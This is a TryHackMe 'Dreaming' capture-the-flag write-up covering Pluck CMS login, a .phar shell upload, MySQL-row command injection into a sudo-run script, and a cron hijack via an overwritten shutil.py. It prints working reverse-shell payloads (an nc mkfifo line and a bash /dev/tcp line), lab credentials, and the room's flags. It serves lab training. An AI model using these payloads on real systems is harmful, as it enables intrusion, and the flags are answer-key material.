## Dreaming - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/dreaming)

<i>While the king of dreams was imprisoned, his home fell into ruins.

Can you help Sandman restore his kingdom?</i>

**IP: 10.10.60.142**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Ffuf<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.60.142

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 61:c4:c0:88:5c:5b:c4:ba:e7:4a:3b:69:e5:e1:b8:f6 (RSA)
  |   256 5d:64:ac:67:74:20:c2:02:d9:40:64:cd:3e:3f:d0:88 (ECDSA)
  |_  256 c8:3a:62:10:23:a4:b7:90:c6:1a:7a:0d:47:da:02:db (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.60.142/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  app                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 46ms]
  ```
  
- When I went to login page `http://10.10.60.142/app/pluck-4.7.13/login.php`, well, I just typed `password` and got in LULZ.

---

## ⚙️ Shell Access

- So, I immediately tried uploading a shell, but my PHP shell didn't work. When I looked for some exploits, I found this [one](https://www.exploit-db.com/exploits/49909).

- In the code you can see that exploit uploads a `.phar` file, so I changed my shell to `.phar`, uploaded it and got a connection.

  ```
  cp shell.php shell.phar

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.60.142] 36328
  Linux ip-10-10-60-142 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
   20:39:34 up 31 min,  0 users,  load average: 0.00, 0.01, 0.02
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Now let's get those flags.

---

## 🧍 User Privilege Escalation

- You can find the Lucien flag easily but you can't read it. After some enumeration, I looked for all the files related to user `lucien` and got what I need.

  ```
  www-data@ip-10-10-60-142:/home$ find / -user lucien 2>/dev/null
  /opt/test.py
  /home/lucien
  /home/lucien/.ssh
  /home/lucien/.local
  /home/lucien/.local/share
  /home/lucien/.local/lib
  /home/lucien/.local/lib/python3.8
  /home/lucien/.local/lib/python3.8/site-packages
  /home/lucien/.sudo_as_admin_successful
  /home/lucien/.mysql_history
  /home/lucien/.bash_history
  /home/lucien/.profile
  /home/lucien/.bash_logout
  /home/lucien/.cache
  /home/lucien/.bashrc
  /home/lucien/lucien_flag.txt
  
  www-data@ip-10-10-60-142:/home$ cat /opt/test.py 
  import requests
  
  #Todo add myself as a user
  url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
  password = "HeyLucien#@1999!"
  
  data = {
          "cont1":password,
          "bogus":"",
          "submit":"Log+in"
          }
  
  req = requests.post(url,data=data)
  
  if "Password correct." in req.text:
      print("Everything is in proper order. Status Code: " + str(req.status_code))
  else:
      print("Something is wrong. Status Code: " + str(req.status_code))
      print("Results:\n" + req.text)
  ```
  
- In the `test.py` script, you can find Lucien's password. Switch to that user and get the first flag.

  ```
  www-data@ip-10-10-60-142:/home$ su lucien
  Password: 
  lucien@ip-10-10-60-142:/home$ whoami
  lucien
  lucien@ip-10-10-60-142:/home$ id
  uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)

  lucien@ip-10-10-60-142:~$ cat lucien_flag.txt 
  THM{TH3_L1BR4R14N}
  ```
  
- Now, login with SSH since it's more stable shell. With `lucien` when I ran `sudo -l` I found this bad boi.

  ```
  lucien@ip-10-10-60-142:/home/death$ sudo -l
  Matching Defaults entries for lucien on ip-10-10-60-142:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User lucien may run the following commands on ip-10-10-60-142:
      (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
  ```

- We don't have any permissions when it comes to files in `death` directory, so I did the same enumeration I did for `lucien`.

  ```
  lucien@ip-10-10-60-142:/home/death$ find / -user death 2>/dev/null
  /opt/getDreams.py
  /home/death
  /home/death/.local
  /home/death/.local/share
  /home/death/.local/lib
  /home/death/.local/lib/python3.8
  /home/death/.local/lib/python3.8/site-packages
  /home/death/.viminfo
  /home/death/.mysql_history
  /home/death/getDreams.py
  /home/death/.bash_history
  /home/death/.wget-hsts
  /home/death/.profile
  /home/death/.bash_logout
  /home/death/.cache
  /home/death/death_flag.txt
  /home/death/.bashrc
  
  lucien@ip-10-10-60-142:/home/death$ cat /opt/getDreams.py 
  import mysql.connector
  import subprocess
  
  # MySQL credentials
  DB_USER = "death"
  DB_PASS = "#redacted"
  DB_NAME = "library"
  
  import mysql.connector
  import subprocess
  
  def getDreams():
      try:
          # Connect to the MySQL database
          connection = mysql.connector.connect(
              host="localhost",
              user=DB_USER,
              password=DB_PASS,
              database=DB_NAME
          )
  
          # Create a cursor object to execute SQL queries
          cursor = connection.cursor()
  
          # Construct the MySQL query to fetch dreamer and dream columns from dreams table
          query = "SELECT dreamer, dream FROM dreams;"
  
          # Execute the query
          cursor.execute(query)
  
          # Fetch all the dreamer and dream information
          dreams_info = cursor.fetchall()
  
          if not dreams_info:
              print("No dreams found in the database.")
          else:
              # Loop through the results and echo the information using subprocess
              for dream_info in dreams_info:
                  dreamer, dream = dream_info
                  command = f"echo {dreamer} + {dream}"
                  shell = subprocess.check_output(command, text=True, shell=True)
                  print(shell)
  
      except mysql.connector.Error as error:
          # Handle any errors that might occur during the database connection or query execution
          print(f"Error: {error}")
  
      finally:
          # Close the cursor and connection
          cursor.close()
          connection.close()
  
  # Call the function to echo the dreamer and dream information
  getDreams()
  ```

- GOTEM COACH! Since we have read access in `/opt` directory and the script is also there, now we have info about MySQL database. Unfortunately we don't have any credentials to access it.

- After looking around a bit, I found `lucien` credentials for MySQL db.

  ```
  lucien@ip-10-10-60-142:~$ cat .bash_history 
  ls
  cd /etc/ssh/
  clear
  nano sshd_config
  su root
  cd ..
  ls
  cd ..
  cd etc
  ls
  ..
  cd ..
  cd usr
  cd lib
  cd python3.8
  nano shutil.py 
  clear
  clear
  su root
  cd ~~
  cd ~
  clear
  ls
  mysql -u lucien -plucien42DBPASSWORD
  ls -la
  cat .bash_history 
  cat .mysql_history 
  [SNIP!]
  ```

- Let's check the database now.

  ```
  lucien@ip-10-10-60-142:~$ mysql -u lucien -p
  Enter password: 
  Welcome to the MySQL monitor.  Commands end with ; or \g.
  Your MySQL connection id is 10
  Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)
  
  Copyright (c) 2000, 2025, Oracle and/or its affiliates.
  
  Oracle is a registered trademark of Oracle Corporation and/or its
  affiliates. Other names may be trademarks of their respective
  owners.
  
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
  
  mysql> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | library            |
  | mysql              |
  | performance_schema |
  | sys                |
  +--------------------+
  5 rows in set (0.08 sec)
  
  mysql> use library;
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with -A
  
  Database changed
  mysql> show tables;
  +-------------------+
  | Tables_in_library |
  +-------------------+
  | dreams            |
  +-------------------+
  1 row in set (0.00 sec)
  
  mysql> select * from dreams;
  +---------+------------------------------------+
  | dreamer | dream                              |
  +---------+------------------------------------+
  | Alice   | Flying in the sky                  |
  | Bob     | Exploring ancient ruins            |
  | Carol   | Becoming a successful entrepreneur |
  | Dave    | Becoming a professional musician   |
  +---------+------------------------------------+
  4 rows in set (0.00 sec)
  ```

- OK, now comes the best part. You can see that the `getDreams.py` script adds users to this database by executing `command = f"echo {dreamer} + {dream}"`.
  So now we are going to add a reverse shell as a new user and run the script as `death` which is confirmed with `sudo -l`.
  This is the paylod: `INSERT INTO dreams (dreamer, dream) VALUES ('[USERNAME]', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] [PORT] >/tmp/f)');`

  ```
  mysql> INSERT INTO dreams (dreamer, dream) VALUES ('Bimbo', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f)');
  Query OK, 1 row affected (0.02 sec)
  
  mysql> select * from dreams;
  +---------+-------------------------------------------------------------------------------------+
  | dreamer | dream                                                                               |
  +---------+-------------------------------------------------------------------------------------+
  | Alice   | Flying in the sky                                                                   |
  | Bob     | Exploring ancient ruins                                                             | 
  | Carol   | Becoming a successful entrepreneur                                                  |
  | Dave    | Becoming a professional musician                                                    |
  | Bimbo   | $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f) |
  +---------+-------------------------------------------------------------------------------------+
  5 rows in set (0.00 sec)
  ```
  
- Start a listener and run a script.

  ```
  lucien@ip-10-10-60-142:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py 
  Alice + Flying in the sky
  
  Bob + Exploring ancient ruins
  
  Carol + Becoming a successful entrepreneur
  
  Dave + Becoming a professional musician
  
  rm: cannot remove '/tmp/f': No such file or directory
  
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.60.142] 39640
  $ whoami
  death
  $ id
  uid=1001(death) gid=1001(death) groups=1001(death)
  ```

- Read `death` flag and then move to `morpheus` flag.

- Here I found these bad bois:

  ```
  death@ip-10-10-60-142:/home/morpheus$ cat kingdom 
  We saved the kingdom!
  
  death@ip-10-10-60-142:/home/morpheus$ cat restore.py 
  from shutil import copy2 as backup
  
  src_file = "/home/morpheus/kingdom"
  dst_file = "/kingdom_backup/kingdom"
  ```

- This `restore.py` script can be our way to the flag. Since it uses `shutil` which is a Python module, let's check if we can write to it and since it's purpose is to create backups we will check if it is running in the background like a cronjob.

  ```
  find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/home/death/*" -writable 2>/dev/null

  death@ip-10-10-60-142:/$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/home/death/*" -writable 2>/dev/null
  /var/www/html/app/pluck-4.7.13/data/settings/token.php
  /var/www/html/app/pluck-4.7.13/data/settings/install.dat
  /var/www/html/app/pluck-4.7.13/data/settings/langpref.php
  /var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
  /var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
  /var/www/html/app/pluck-4.7.13/data/settings/themepref.php
  /var/www/html/app/pluck-4.7.13/data/settings/pass.php
  /var/www/html/app/pluck-4.7.13/data/settings/options.php
  /var/www/html/app/pluck-4.7.13/data/trash/files/shell.php.txt
  /dev/shm/.pkexec/gconv-modules
  /dev/shm/GCONV_PATH=./.pkexec
  /dev/shm/PwnKit
  /usr/lib/python3.8/shutil.py
  /opt/getDreams.py
  
  death@ip-10-10-60-142:/home/morpheus$ ps aux | grep '[p]ython'
  root         709  0.0  1.3  29672 12500 ?        Ss   20:09   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
  root         813  0.0  1.2 107952 11744 ?        Ssl  20:09   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
  root        2411  0.0  0.3   9584  3156 pts/0    S    21:19   0:00 sudo -u death /usr/bin/python3 /home/death/getDreams.py
  death       2413  0.0  1.4  26016 13712 pts/0    S    21:19   0:00 /usr/bin/python3 /home/death/getDreams.py
  death       2440  0.0  0.7  15884  7236 pts/0    S+   21:21   0:00 python3 -c import pty;pty.spawn("/bin/bash");
  morpheus    2582  0.0  0.0   2616   596 ?        Ss   21:37   0:00 /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py
  morpheus    2584  0.0  0.9  15768  9512 ?        S    21:37   0:00 /usr/bin/python3.8 /home/morpheus/restore.py
  morpheus    2589  0.0  0.0   2616   528 ?        Ss   21:38   0:00 /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py
  morpheus    2591  0.0  0.9  15768  9536 ?        S    21:38   0:00 /usr/bin/python3.8 /home/morpheus/restore.py
  ```

- BOOOOOOOOOOOOOM! You can also see that I tried `PwnKit` but it did nothing LULZ. Now comes the easy part, add a reverse shell to `shutil` module and start a listener. After a minute you will get a shell as `morpheus`.

  ```
  death@ip-10-10-60-142:/home/morpheus$ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/5555 0>&1'\")" > /usr/lib/python3.8/shutil.py

  nc -lvnp 5555
  listening on [any] 5555 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.60.142] 40808
  bash: cannot set terminal process group (2685): Inappropriate ioctl for device
  bash: no job control in this shell
  morpheus@ip-10-10-60-142:~$ whoami
  whoami
  morpheus
  morpheus@ip-10-10-60-142:~$ id
  id
  uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
  ```

- Read the last flag and cya in the next one!

---

## 🏁 Flags

- **Lucien Flag**: `THM{TH3_L1BR4R14N}`
- **Death Flag**: `THM{1M_TH3R3_4_TH3M}`
- **Morpheus Flag**: `THM{DR34MS_5H4P3_TH3_W0RLD}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way around the CTF.`

- What did I learn?
  `Few new escalation methods, getting reverse shell through MySQL is sick!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
